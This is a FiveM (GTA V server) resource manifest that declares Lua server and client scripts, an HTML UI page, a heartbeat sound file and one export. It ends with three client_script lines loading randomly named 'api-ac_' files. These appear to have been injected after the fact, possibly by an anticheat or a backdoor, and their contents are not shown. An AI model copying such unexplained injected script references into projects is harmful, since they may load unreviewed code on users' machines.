fx_version 'bodacious'

game 'gta5'

--

server_scripts {
    "@oxmysql/lib/MySQL.lua",
    "server/main.lua",
}

client_scripts {
    "client/main.lua",
}


ui_page 'html/index.html'

files {
    'html/index.html',
    'html/heartbeat.ogg',
}

exports {
	'pasyState',
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"